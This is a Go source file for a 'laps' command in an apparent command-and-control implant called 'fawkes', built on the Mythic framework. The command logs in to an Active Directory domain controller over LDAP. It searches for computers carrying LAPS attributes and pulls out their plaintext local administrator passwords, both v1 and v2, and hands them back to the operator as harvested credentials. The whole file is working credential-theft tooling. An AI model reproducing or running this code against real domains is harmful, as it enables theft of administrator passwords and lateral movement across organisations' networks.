package commands

import (
	"encoding/json"
	"fmt"
	"strconv"
	"time"

	"fawkes/pkg/structs"

	"github.com/go-ldap/ldap/v3"
)

type LapsCommand struct{}

func (c *LapsCommand) Name() string { return "laps" }
func (c *LapsCommand) Description() string {
	return "Read LAPS passwords from Active Directory (T1552.006)"
}

type lapsArgs struct {
	Server   string `json:"server"`
	Username string `json:"username"`
	Password string `json:"password"`
	Filter   string `json:"filter"`
	UseTLS   bool   `json:"use_tls"`
	Port     int    `json:"port"`
	BaseDN   string `json:"base_dn"`
}

// lapsV2Password represents the JSON structure of ms-LAPS-Password
type lapsV2Password struct {
	AccountName string `json:"n"`
	Timestamp   string `json:"t"`
	Password    string `json:"p"`
	ManagedName string `json:"a"`
}

func (c *LapsCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return errorResult("Error: parameters required. Use -server <DC> -username <user@domain> -password <pass> [-filter <computer>]")
	}

	var args lapsArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}
	defer zeroCredentials(&args.Password)

	if args.Server == "" {
		return errorResult("Error: server parameter required (domain controller IP or hostname)")
	}

	// Reuse LDAP connection helpers from ldap_query.go
	connArgs := ldapQueryArgs{
		Server:   args.Server,
		Port:     args.Port,
		Username: args.Username,
		Password: args.Password,
		UseTLS:   args.UseTLS,
	}
	if connArgs.Port <= 0 {
		if connArgs.UseTLS {
			connArgs.Port = 636
		} else {
			connArgs.Port = 389
		}
	}

	conn, err := ldapConnect(connArgs)
	if err != nil {
		return errorf("Error connecting to LDAP: %v", err)
	}
	defer conn.Close()

	if err := ldapBind(conn, connArgs); err != nil {
		return errorf("Error binding to LDAP: %v", err)
	}

	baseDN := args.BaseDN
	if baseDN == "" {
		baseDN, err = detectBaseDN(conn)
		if err != nil {
			return errorf("Error detecting base DN: %v", err)
		}
	}

	// Build filter for computers with LAPS attributes
	lapsFilter := "(&(objectClass=computer)(|(ms-Mcs-AdmPwd=*)(ms-LAPS-Password=*)(ms-LAPS-EncryptedPassword=*)))"
	if args.Filter != "" {
		escaped := ldap.EscapeFilter(args.Filter)
		lapsFilter = fmt.Sprintf("(&(objectClass=computer)(sAMAccountName=*%s*)(|(ms-Mcs-AdmPwd=*)(ms-LAPS-Password=*)(ms-LAPS-EncryptedPassword=*)))", escaped)
	}

	searchReq := ldap.NewSearchRequest(
		baseDN,
		ldap.ScopeWholeSubtree,
		ldap.NeverDerefAliases,
		0, 30, false,
		lapsFilter,
		[]string{
			"sAMAccountName", "dNSHostName", "operatingSystem",
			"ms-Mcs-AdmPwd", "ms-Mcs-AdmPwdExpirationTime",
			"ms-LAPS-Password", "ms-LAPS-PasswordExpirationTime",
			"ms-LAPS-EncryptedPassword",
		},
		nil,
	)

	result, err := conn.SearchWithPaging(searchReq, 500)
	if err != nil {
		return errorf("Error searching LDAP: %v", err)
	}

	output, creds := formatLAPSResults(result, baseDN, args.Filter)

	cmdResult := structs.CommandResult{
		Output:    output,
		Status:    "success",
		Completed: true,
	}
	if len(creds) > 0 {
		cmdResult.Credentials = &creds
	}
	return cmdResult
}

// filetimeToTime moved to forensics_helpers.go

func lapsExpiryStatus(expTime time.Time) string {
	remaining := time.Until(expTime)
	if remaining < 0 {
		return "EXPIRED"
	}
	days := int(remaining.Hours() / 24)
	hours := int(remaining.Hours()) % 24
	if days > 0 {
		return fmt.Sprintf("expires in %dd %dh", days, hours)
	}
	return fmt.Sprintf("expires in %dh", hours)
}

// lapsOutputEntry is a single row in the JSON output for browser script rendering.
type lapsOutputEntry struct {
	Computer     string `json:"computer"`
	FQDN         string `json:"fqdn,omitempty"`
	OS           string `json:"os,omitempty"`
	Version      string `json:"version"`
	Account      string `json:"account,omitempty"`
	Password     string `json:"password,omitempty"`
	Expires      string `json:"expires,omitempty"`
	ExpiryStatus string `json:"expiry_status,omitempty"`
}

func formatLAPSResults(result *ldap.SearchResult, baseDN, filter string) (string, []structs.MythicCredential) {
	var creds []structs.MythicCredential

	if len(result.Entries) == 0 {
		return "[]", nil
	}

	var entries []lapsOutputEntry

	for _, entry := range result.Entries {
		name := entry.GetAttributeValue("sAMAccountName")
		fqdn := entry.GetAttributeValue("dNSHostName")
		osInfo := entry.GetAttributeValue("operatingSystem")

		// LAPS v1
		v1Pass := entry.GetAttributeValue("ms-Mcs-AdmPwd")
		v1Exp := entry.GetAttributeValue("ms-Mcs-AdmPwdExpirationTime")
		if v1Pass != "" {
			e := lapsOutputEntry{
				Computer: name,
				FQDN:     fqdn,
				OS:       osInfo,
				Version:  "v1",
				Password: v1Pass,
			}
			if v1Exp != "" {
				if ft, err := strconv.ParseInt(v1Exp, 10, 64); err == nil {
					expTime := filetimeToTime(ft)
					e.Expires = expTime.Format("2006-01-02 15:04 UTC")
					e.ExpiryStatus = lapsExpiryStatus(expTime)
				}
			}
			entries = append(entries, e)
			creds = append(creds, structs.MythicCredential{
				CredentialType: "plaintext",
				Account:        name,
				Credential:     v1Pass,
				Comment:        "laps (v1)",
			})
		}

		// Windows LAPS v2 (plaintext JSON)
		v2Pass := entry.GetAttributeValue("ms-LAPS-Password")
		v2Exp := entry.GetAttributeValue("ms-LAPS-PasswordExpirationTime")
		if v2Pass != "" {
			var v2 lapsV2Password
			if err := json.Unmarshal([]byte(v2Pass), &v2); err == nil {
				account := v2.ManagedName
				if account == "" {
					account = v2.AccountName
				}
				e := lapsOutputEntry{
					Computer: name,
					FQDN:     fqdn,
					OS:       osInfo,
					Version:  "v2",
					Account:  account,
					Password: v2.Password,
				}
				if v2Exp != "" {
					if ft, err := strconv.ParseInt(v2Exp, 10, 64); err == nil {
						expTime := filetimeToTime(ft)
						e.Expires = expTime.Format("2006-01-02 15:04 UTC")
						e.ExpiryStatus = lapsExpiryStatus(expTime)
					}
				}
				entries = append(entries, e)
				credAccount := account
				if credAccount == "" {
					credAccount = name
				}
				creds = append(creds, structs.MythicCredential{
					CredentialType: "plaintext",
					Account:        credAccount,
					Credential:     v2.Password,
					Comment:        "laps (v2)",
				})
			} else {
				entries = append(entries, lapsOutputEntry{
					Computer: name,
					FQDN:     fqdn,
					OS:       osInfo,
					Version:  "v2-raw",
					Password: v2Pass,
				})
			}
		}

		// Windows LAPS v2 (encrypted)
		v2Enc := entry.GetRawAttributeValue("ms-LAPS-EncryptedPassword")
		if len(v2Enc) > 0 {
			entries = append(entries, lapsOutputEntry{
				Computer: name,
				FQDN:     fqdn,
				OS:       osInfo,
				Version:  "v2-encrypted",
				Password: fmt.Sprintf("%d bytes (requires DPAPI backup key)", len(v2Enc)),
			})
		}
	}

	data, err := json.Marshal(entries)
	if err != nil {
		return fmt.Sprintf("Error marshaling output: %v", err), creds
	}
	return string(data), creds
}
